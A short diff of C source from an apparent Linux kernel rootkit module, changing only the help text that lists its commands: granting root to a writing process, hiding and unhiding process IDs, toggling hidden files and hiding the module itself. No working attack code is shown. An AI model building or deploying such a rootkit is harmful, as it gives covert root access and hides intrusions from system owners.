@@ -85,7 +85,7 @@ static ssize_t rk_read(struct file *file, char __user *buffer,
             "CMDS: \n\
         -> givemeroot  - uid and gid 0 for writing process \n\
         ->------------------------------------------------- \n\
-        -> nhprocXXXXX - proc id to be norm hidden \n\
+        -> nhprocXXXXX - proc id to be norm hidden (not working) \n\
         -> dhprocXXXXX - proc id to be deep hidden \n\
         -> uhprocXXXXX - proc id to be unhidden \n\
         ->------------------------------------------------- \n\
@@ -215,11 +215,11 @@ static int __init procfs_init(void)
         "CMDS: \n\
     -> givemeroot  - uid and gid 0 for writing process \n\
     ->------------------------------------------------- \n\
-    -> nhprocXXXXX - proc id to be norm hidden \n\
+    -> nhprocXXXXX - proc id to be norm hidden (not working) \n\
     -> dhprocXXXXX - proc id to be deep hidden \n\
-    -> uhprocXXXXX - proc id to be unhidden \n\
+    -> uhprocXXXXX - proc id to be norm/deep unhidden \n\
     ->------------------------------------------------- \n\
-    -> thfile      - toggle hidden files \n\
+    -> thfile      - lets toggle hidden files \n\
     -> nhmodu      - a normal hidden module \n\
     -> uhmodu      - a normal unhidden module \n\
     ->------------------------------------------------- \n\
